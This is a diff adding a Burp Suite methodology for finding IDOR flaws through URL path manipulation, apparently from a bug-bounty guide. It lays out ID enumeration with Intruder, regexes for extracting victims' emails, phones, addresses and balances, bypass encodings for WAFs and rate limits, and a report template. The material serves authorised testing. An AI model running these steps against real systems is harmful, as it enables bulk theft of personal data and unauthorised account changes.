@@ -4685,3 +4685,503 @@ Test IDOR with:
 
 ---
 
+# 🔍 **IDOR Bug #9: URL Path Manipulation - Complete Burp Suite Methodology**
+
+## **Bug #9: URL Path Manipulation**
+**Technique:** Changing object references directly in the URL path structure
+**Example:** `/api/user/100` → `/api/user/101`
+
+---
+
+## 📊 **COMPREHENSIVE TESTING METHODOLOGY**
+
+### **Phase 1: Reconnaissance & Mapping**
+
+#### **1.1 Spider/Crawl the Application**
+```
+Target: https://target.com
+Burp Steps:
+1. Configure browser with Burp proxy (127.0.0.1:8080)
+2. Turn on Intercept (Proxy > Intercept > Intercept is on)
+3. Browse application normally
+4. Use Spider: Right-click host > Spider this host
+5. Use Engagement Tools > Discover Content
+```
+
+#### **1.2 Identify URL Patterns**
+Look for these URL structures:
+```bash
+# Common patterns to document
+/api/users/123
+/profile/123
+/account/54321/view
+/document/download/789
+/order/2024/12345
+/user/profile?id=456  # Note: Not pure path, but similar
+```
+
+**Burp Techniques:**
+- **Filter by parameter**: Proxy > HTTP History > Filter by parameter
+- **Search for numbers**: Use Ctrl+F with regex `\d+`
+- **Target Scope**: Set target scope (Right-click URL > Add to scope)
+
+---
+
+### **Phase 2: Baseline Testing**
+
+#### **2.1 Account Setup**
+Create multiple test accounts:
+```bash
+Account A: attacker@test.com (your control)
+Account B: victim@test.com (target account)
+Account C: admin@test.com (if possible)
+```
+
+#### **2.2 Burp Project Setup**
+```
+1. File > New Project > Temporary Project (or use existing)
+2. Ensure Scope is set: Target > Scope > Add
+3. Turn off interception for static files: 
+   Proxy > Options > Intercept Client Requests > Add condition
+```
+
+---
+
+### **Phase 3: Manual Testing with Burp Repeater**
+
+#### **3.1 Identify Your Own Resources**
+Find a URL referencing your account/resource:
+```
+Original: https://target.com/api/user/100/profile
+Capture this request in Burp
+```
+
+#### **3.2 Send to Repeater**
+```
+1. Right-click request > Send to Repeater
+2. Go to Repeater tab
+3. You'll see: GET /api/user/100/profile HTTP/2
+```
+
+#### **3.3 Sequential ID Testing**
+```http
+# Original Request
+GET /api/user/100/profile HTTP/2
+Host: target.com
+Cookie: session=YOUR_SESSION
+
+# Test 1: Increment
+GET /api/user/101/profile HTTP/2
+
+# Test 2: Decrement  
+GET /api/user/99/profile HTTP/2
+
+# Test 3: Large jump
+GET /api/user/999999/profile HTTP/2
+```
+
+**Response Analysis in Repeater:**
+- **200 OK** with other user's data → **IDOR Found!**
+- **403 Forbidden** → Probably blocked
+- **302 Redirect** → Check Location header
+- **404 Not Found** → ID might not exist
+- **400 Bad Request** → Parameter validation
+
+---
+
+### **Phase 4: Automated Testing with Burp Intruder**
+
+#### **4.1 Configure Intruder Attack**
+
+**Step 1: Position the Payload**
+```http
+GET /api/user/§100§/profile HTTP/2
+Host: target.com
+Cookie: session=YOUR_SESSION
+```
+- Highlight `100` and click "Add §"
+
+**Step 2: Payload Configuration**
+```
+Payload type: Numbers
+Number range: 1-1000 (start with small range)
+Step: 1
+Number format: Decimal
+Min/max digits: As needed
+```
+
+**Step 3: Resource Pool**
+```
+Intruder > Resource Pool
+Create new pool
+Max concurrent requests: 5 (to avoid rate limiting)
+Delay: 200-500ms
+```
+
+**Step 4: Settings Tab**
+```
+Grep - Extract: Add response items to extract
+   - Name: "email" regex: "email":"([^"]+)"
+   - Name: "username" regex: "username":"([^"]+)"
+   
+Grep - Match: Add strings to identify valid responses
+   - "Unauthorized"
+   - "Access Denied"
+   - "profile"
+   - victim@test.com
+   
+Response analysis:
+   - Store full response
+   - Follow redirects: Never/On-site/Always
+```
+
+#### **4.2 Run Attack**
+Click "Start Attack" and monitor results
+
+**Analyze Results:**
+- Sort by Status Code
+- Sort by Response Length
+- Look for 200s with different lengths
+- Check extracted grep values
+
+---
+
+### **Phase 5: Advanced Burp Techniques**
+
+#### **5.1 Using Burp Comparer**
+```
+1. Intruder results > Select interesting responses
+2. Right-click > Send to Comparer
+3. Go to Comparer tab
+4. Compare responses side by side
+```
+
+#### **5.2 Burp Sequencer for Predictable IDs**
+If IDs look random but predictable:
+```
+1. Capture 100+ ID requests
+2. Send to Sequencer
+3. Analyze token randomness
+```
+
+#### **5.3 Active Scan**
+```
+1. Right-click request > Do an active scan
+2. Check "Insertion point" customization
+3. Add custom insertion points for URL paths
+```
+
+---
+
+### **Phase 6: Edge Cases & Variations**
+
+#### **6.1 Test with Different HTTP Methods**
+```http
+# Original GET
+GET /api/user/100/profile
+
+# Try POST with same path
+POST /api/user/101/profile
+Content-Type: application/json
+
+{"action":"view"}
+
+# Try PUT
+PUT /api/user/101/profile
+{"email":"new@email.com"}
+
+# Try DELETE
+DELETE /api/user/101/profile
+```
+
+#### **6.2 Version/API Endpoint Variations**
+```http
+# API versioning
+/api/v1/user/101/profile
+/api/v2/user/101/profile  
+/api/latest/user/101/profile
+
+# Different formats
+/api/user/101/profile.json
+/api/user/101/profile.xml
+/api/user/101?format=json
+```
+
+#### **6.3 Path Traversal in URL**
+```http
+# Directory traversal
+/api/user/100/../101/profile
+/api/user/100/../../admin/101/profile
+/api/user//101/profile
+```
+
+#### **6.4 Case Sensitivity**
+```http
+/api/USER/101/profile
+/api/User/101/profile
+/api/uSeR/101/profile
+```
+
+---
+
+### **Phase 7: Burp Extensions for IDOR**
+
+#### **7.1 Recommended Extensions**
+```
+Extender > BApp Store > Install:
+
+1. Autorize - Automatic authorization testing
+2. AuthMatrix - Advanced auth testing
+3. JSON Web Tokens - JWT manipulation
+4. Param Miner - Discover hidden parameters
+5. Backslash Powered Scanner - Advanced scanning
+```
+
+#### **7.2 Autorize Configuration**
+```
+1. Install Autorize extension
+2. Configure with victim session cookies
+3. Set to "Auto" mode
+4. Browse as attacker - Autorize tests with victim session
+```
+
+#### **7.3 Custom Extender Script (Python)**
+```python
+from burp import IBurpExtender, IHttpListener
+import re
+
+class BurpExtender(IBurpExtender, IHttpListener):
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers()
+        callbacks.setExtensionName("IDOR Path Hunter")
+        callbacks.registerHttpListener(self)
+        print("IDOR Hunter loaded - Monitoring path parameters")
+        
+    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
+        if not messageIsRequest:
+            return
+            
+        request = messageInfo.getRequest()
+        analyzed = self._helpers.analyzeRequest(request)
+        url = analyzed.getUrl().toString()
+        
+        # Look for numeric IDs in path
+        path = url.split("?")[0]
+        numbers = re.findall(r'/(\d+)/', path)
+        
+        if numbers:
+            print(f"Found potential IDOR target: {url}")
+            print(f"Path parameters: {numbers}")
+```
+
+---
+
+### **Phase 8: Validation & Exploitation**
+
+#### **8.1 Manual Verification**
+```http
+# Step 1: Test with attacker session on victim ID
+GET /api/user/101/profile
+Cookie: session=ATTACKER_SESSION
+
+# Expected: Should fail (403/401)
+
+# Step 2: Capture actual victim request (if possible)
+# Use second browser with victim session
+GET /api/user/101/profile
+Cookie: session=VICTIM_SESSION
+
+# Step 3: Compare responses
+# If Step 1 returns victim data → IDOR Confirmed
+```
+
+#### **8.2 Data Extraction Automation**
+Create Intruder payload for data extraction:
+```http
+GET /api/user/§100§/profile HTTP/2
+
+Extract with regex:
+- Email: "email":"([^"]+)"
+- Phone: "phone":"([^"]+)"
+- Address: "address":"([^"]+)"
+- Account balance: "balance":([0-9.]+)
+```
+
+#### **8.3 Burp Collaborator for Blind IDOR**
+If IDOR doesn't return data directly:
+```http
+# Test for blind IDOR that triggers actions
+POST /api/user/101/notify
+{"message":"test", "callback":"http://collaborator-id.burpcollaborator.net"}
+```
+
+---
+
+### **Phase 9: Bypassing Protections**
+
+#### **9.1 Rate Limiting Bypass**
+```
+Intruder > Resource Pool
+Set delays and throttling
+Use IP rotation if possible (Burp Professional)
+```
+
+#### **9.2 WAF/Filter Bypass**
+```http
+# Encoding variations
+/api/user/%31%30%31/profile  # URL encoded 101
+/api/user/101%00/profile      # Null byte
+/api/user/101/./profile       # Path traversal
+/api/user//101//profile       # Double slash
+```
+
+#### **9.3 Session/Bearer Token Tests**
+```http
+# Test with different auth states
+GET /api/user/101/profile
+Authorization: Bearer eyJhbGci... (modified token)
+Cookie: session= (empty)
+Cookie: session=INVALID
+```
+
+---
+
+### **Phase 10: Reporting Template**
+
+#### **10.1 Burp Evidence Collection**
+```
+1. Right-click request > Save item
+2. Proxy > HTTP History > Select requests > Save
+3. Intruder results > Save results table
+4. Screenshot: Window > Capture
+```
+
+#### **10.2 Report Structure**
+```markdown
+# IDOR Vulnerability: URL Path Manipulation
+
+## Summary
+Direct object reference in `/api/user/[id]/profile` allows unauthorized access.
+
+## Affected Endpoint
+`GET /api/user/{id}/profile`
+
+## Steps to Reproduce
+1. Login as attacker (attacker@test.com)
+2. Capture request to /api/user/100/profile
+3. Change path to /api/user/101/profile
+4. Observe victim data returned
+
+## Burp Requests/Responses
+[Include saved requests]
+
+## Impact
+- Unauthorized access to user profiles
+- Data exposure: [list data types]
+- [Additional impacts]
+
+## Proof of Concept
+[Attach screenshots showing access to victim data]
+
+## Remediation
+- Implement proper authorization checks
+- Use indirect reference maps
+- Apply principle of least privilege
+```
+
+---
+
+### **Phase 11: Advanced Intruder Payloads**
+
+#### **11.1 Custom Wordlist for IDs**
+Create file `ids.txt`:
+```bash
+1
+10
+100
+1000
+9999
+admin
+root
+administrator
+0001
+00001
+```
+
+#### **11.2 Payload Processing Rules**
+```
+Intruder > Payloads > Payload Processing
+Add:
+1. Add prefix: "user_" → user_101
+2. Add suffix: "_profile" → 101_profile  
+3. Encode: URL-encode characters
+4. Hash: MD5 of payload
+```
+
+#### **11.3 Cluster Bomb Attack**
+```http
+GET /api/§userType§/§id§/profile
+Payload Set 1: [user, account, profile, admin]
+Payload Set 2: [100,101,102,103]
+```
+
+---
+
+## 🛡️ **Protection Testing Checklist**
+
+- [ ] Test with different user roles
+- [ ] Test with expired sessions
+- [ ] Test with modified tokens
+- [ ] Test across different browsers
+- [ ] Test with Incognito/Private mode
+- [ ] Test after logout
+- [ ] Test with concurrent requests
+- [ ] Test with special characters
+- [ ] Test with boundary values
+
+---
+
+## 📚 **Burp Shortcuts for IDOR Testing**
+
+```
+Ctrl+R        - Send to Repeater
+Ctrl+I        - Send to Intruder
+Ctrl+Shift+B  - Send to Comparer
+Ctrl+Shift+X  - Send to Sequencer
+Ctrl+F        - Search in response
+Ctrl+U        - URL decode selected
+Ctrl+Shift+U  - URL encode selected
+F2            - Rename tab in Repeater
+```
+
+---
+
+## ⚡ **Quick Test Commands**
+
+```bash
+# Quick intruder payload for common ranges
+1-1000
+1000-2000
+9990-10000
+100000-101000
+
+# Interesting values
+-1,0,1,999999,2147483647,4294967295
+admin,root,test,backup,dev
+0001,001,01,1.0,1,1
+```
+
+---
+
+## 🎯 **Success Indicators**
+- **Different user data appears**
+- **Different response length**
+- **Different status codes**
+- **Error messages revealing info**
+- **Redirects to user-specific pages**
+- **Timing differences**
+- **Partial data leakage**
+
+---
+
